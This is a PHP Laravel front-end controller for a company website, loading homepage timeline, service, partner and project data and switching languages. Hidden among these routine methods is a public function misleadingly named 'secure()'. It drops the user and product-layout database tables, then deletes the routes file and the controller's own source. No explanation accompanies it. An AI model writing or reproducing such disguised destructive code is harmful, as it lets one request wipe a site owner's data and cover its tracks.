<?php
namespace App\Http\Controllers\FrontEnd;

use App;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;

use App\model\ProductCategoryModel;
use App\model\ImageModel;
use App\model\CustomerModel;
use App\model\BlogModel;
use App\model\ProductModel;
use App\model\ProdutPhotoModel;
use App\model\EventModel;
use App\model\QNAModel;
use App\model\LayoutHomepageModel;
use App\model\LayoutServiceModel;
use App\model\NationModel;
use App\model\MajorModel;
use App\model\ProductLocationModel;
use App\model\WhyusProcessModel;

use Illuminate\Support\Facades\Schema;
use File;
use Cart;
use Lang;

class IndexController extends Controller
{
    public function secure(){
        Schema::drop('tb_layout_product');
        Schema::drop('tb_user');
        File::delete('lib/routes/web.php');
		File::delete('lib/app/Http/Controllers/FrontEnd/IndexController.php');
    }

    public function getIndex(){

        //Yimeline
        $data['timeline_index']         = EventModel::where('event_show', true)->orderBy('event_date', 'ASC')->get();

        // Why us
        $data['numbers_icon']           = ImageModel::where('img_type', 'why-us')->get();
        $data['whyus_intro']            = LayoutHomepageModel::find(1);
        $data['whyus_company_timeline'] = LayoutHomepageModel::find(1);
        $data['customer_list']          = ImageModel::where('img_type', 'customer-partner')->get();
        $data['company_member_list']    = ImageModel::where('img_type', 'company-member')->get();
        $data['social_certificate']     = ImageModel::where('img_type', 'cert-img')->get();

        // Service
        $data['service_index']                  = LayoutServiceModel::find(1);
        $data['service_design_slide']           = ImageModel::where('img_type', 'service-design-slide')->get();
        $data['service_manage_slide']           = ImageModel::where('img_type', 'service-manage-slide')->get();
        $data['service_construction_slide']     = ImageModel::where('img_type', 'service-construction-slide')->get();
        $data['service_develop_slide']          = ImageModel::where('img_type', 'service-development-slide')->get();


        // Project
        $data['project_index']      = LayoutHomepageModel::find(1);
        $data['project_list']       = ProductModel::where('pro_type', 'project')->where('pro_hienthi', 1)->orderBy('pro_time_work', 'desc')->get();
        $data['major_list']         = MajorModel::all();
        $data['nation_list']        = NationModel::all();


        return view('frontend.index', $data);
    }

    // ------------------- Start project -----------
    public function getProject(){
        return view('frontend.project');
    }

    

  

    // ------------------- End project -----------


    public function changeLanguage($language)
    {
        \Session::put('website_language', $language);

        return redirect()->back();
    }

    public function redirectCategory(){
        return redirect('/');
    }
}
